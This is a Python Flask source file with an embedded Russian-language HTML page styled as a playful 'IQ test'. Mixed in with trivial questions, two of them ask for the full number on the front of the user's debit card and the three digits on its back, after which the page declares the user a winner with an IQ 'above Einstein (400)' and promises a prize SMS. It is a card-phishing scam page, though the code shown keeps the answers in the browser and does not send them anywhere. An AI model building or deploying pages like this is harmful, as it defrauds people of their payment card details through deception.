from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# Вопросы теста
QUESTIONS = [
    {"text": "Есть ли у вас кот?", "type": "text"},
    {"text": "Введите цифру (1-100)", "type": "number"},
    {"text": "Нужна дебетовая карта, впишите цифры лицевой стороны(их больше 3х)", "type": "number"},
    {"text": "Сколько будет 2+2?", "type": "number"},
    {"text": "Какой цвет у неба в ясный день?", "type": "text"},
    {"text": "Что тяжелее: 1 кг пуха или 1 кг железа?", "type": "text"},
    {"text": "Какого цвета бумага", "type": "text"},
    {"text": "Что пьет ребенок коровы?", "type": "text"},
    {"text": "Впишите 3 цифры с оборотной стороны вашей карты", "type": "number"},
]

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🧠 Проверь свой IQ - Гениальность</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .test-container {
            background: white;
            border-radius: 32px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 600px;
            width: 100%;
            padding: 40px;
            transition: transform 0.3s ease;
        }

        h1 {
            text-align: center;
            color: #764ba2;
            font-size: 2.2em;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        h1 span {
            font-size: 1.5em;
        }

        .subtitle {
            text-align: center;
            color: #888;
            margin-bottom: 30px;
            font-size: 0.9em;
        }

        .counter {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            padding: 10px 20px;
            border-radius: 40px;
            text-align: center;
            font-size: 1.2em;
            font-weight: bold;
            margin-bottom: 30px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }

        .question {
            font-size: 1.8em;
            font-weight: bold;
            color: #333;
            margin-bottom: 30px;
            text-align: center;
            padding: 20px;
            background: #f8f9ff;
            border-radius: 20px;
        }

        .answer-area {
            margin-bottom: 30px;
        }

        input {
            width: 100%;
            padding: 16px 20px;
            font-size: 1.2em;
            border: 3px solid #e0e0e0;
            border-radius: 50px;
            outline: none;
            transition: all 0.3s ease;
            text-align: center;
            font-family: inherit;
        }

        input:focus {
            border-color: #764ba2;
            box-shadow: 0 0 0 3px rgba(118, 75, 162, 0.2);
        }

        button {
            width: 100%;
            padding: 16px;
            font-size: 1.2em;
            font-weight: bold;
            color: white;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            font-family: inherit;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }

        button:active {
            transform: translateY(0);
        }

        .result {
            margin-top: 25px;
            padding: 20px;
            background: linear-gradient(135deg, #f5f0ff, #fff);
            border-radius: 20px;
            text-align: center;
            font-size: 1.3em;
            font-weight: bold;
            color: #764ba2;
            border: 2px solid #e0d4ff;
        }

        .fireworks {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1000;
        }

        @keyframes pop {
            0% { transform: scale(0); opacity: 1; }
            100% { transform: scale(1.5); opacity: 0; }
        }

        @keyframes float {
            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
            100% { transform: translateY(-200px) rotate(360deg); opacity: 0; }
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }

        .congrats {
            animation: bounce 0.6s ease;
        }
    </style>
</head>
<body>
    <div class="test-container" id="app">
        <h1>
            <span>🧠</span>
            Проверь свой IQ
            <span>✨</span>
        </h1>
        <div class="subtitle">Тест на гениальность</div>

        <div class="counter" id="counter">
            Вопрос <span id="currentNum">1</span> из <span id="totalNum">{{ total }}</span>
        </div>

        <div class="question" id="questionText">
            Загрузка...
        </div>

        <div class="answer-area">
            <input type="text" id="answerInput" placeholder="Введите ваш ответ..." autocomplete="off">
        </div>

        <button id="submitBtn">✈️ Отправить</button>

        <div id="resultArea" style="display: none;"></div>
    </div>

    <script>
        const totalQuestions = {{ total|tojson }};
        let currentIndex = 0;
        let answers = [];
        let questions = {{ questions|tojson }};

        const counterEl = document.getElementById('counter');
        const currentNumEl = document.getElementById('currentNum');
        const totalNumEl = document.getElementById('totalNum');
        const questionTextEl = document.getElementById('questionText');
        const answerInput = document.getElementById('answerInput');
        const submitBtn = document.getElementById('submitBtn');
        const resultArea = document.getElementById('resultArea');

        totalNumEl.textContent = totalQuestions;

        function updateUI() {
            if (currentIndex < totalQuestions) {
                // Показываем текущий вопрос
                counterEl.style.display = 'block';
                currentNumEl.textContent = currentIndex + 1;
                questionTextEl.textContent = questions[currentIndex].text;
                answerInput.value = '';
                answerInput.focus();
                resultArea.style.display = 'none';
                resultArea.innerHTML = '';
            } else {
                // Тест завершен - показываем результат
                counterEl.style.display = 'none';
                questionTextEl.textContent = '🎉 ТЕСТ ЗАВЕРШЕН! 🎉';
                answerInput.style.display = 'none';
                submitBtn.style.display = 'none';

                // Показываем победное сообщение
                resultArea.style.display = 'block';
                resultArea.innerHTML = `
                    <div class="result">
                        ⭐ ВЫ ПОБЕДИТЕЛЬ! ⭐<br>
                        ⭐ ВАШ IQ выше Эйнштейна(400) ⭐<br>
                        📱 ЖДИТЕ СМС О ПОБЕДЕ! 📱<br><br>
                        <span style="font-size: 2em;">🏆</span>
                    </div>
                `;

                // Запускаем эффект конфетти
                celebrate();
            }
        }

        function celebrate() {
            const container = document.querySelector('.test-container');
            container.classList.add('congrats');
            setTimeout(() => container.classList.remove('congrats'), 600);

            // Создаем конфетти
            for (let i = 0; i < 100; i++) {
                createConfetti();
            }
        }

        function createConfetti() {
            const confetti = document.createElement('div');
            confetti.innerHTML = ['🎉', '🎊', '✨', '⭐', '🏆', '🧠', '💡'][Math.floor(Math.random() * 7)];
            confetti.style.position = 'fixed';
            confetti.style.left = Math.random() * window.innerWidth + 'px';
            confetti.style.top = '-20px';
            confetti.style.fontSize = (20 + Math.random() * 30) + 'px';
            confetti.style.pointerEvents = 'none';
            confetti.style.zIndex = '9999';
            confetti.style.animation = `float ${1 + Math.random() * 2}s linear forwards`;
            document.body.appendChild(confetti);
            setTimeout(() => confetti.remove(), 3000);
        }

        function submitAnswer() {
            const answer = answerInput.value.trim();

            if (answer === '') {
                alert('Пожалуйста, введите ответ!');
                return;
            }

            // Сохраняем ответ
            answers.push({
                question: questions[currentIndex].text,
                answer: answer
            });

            currentIndex++;
            updateUI();
        }

        submitBtn.addEventListener('click', submitAnswer);
        answerInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                submitAnswer();
            }
        });

        // Инициализация
        updateUI();
    </script>
</body>
</html>
"""


@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, questions=QUESTIONS, total=len(QUESTIONS))


@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    return jsonify({"status": "ok"})


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)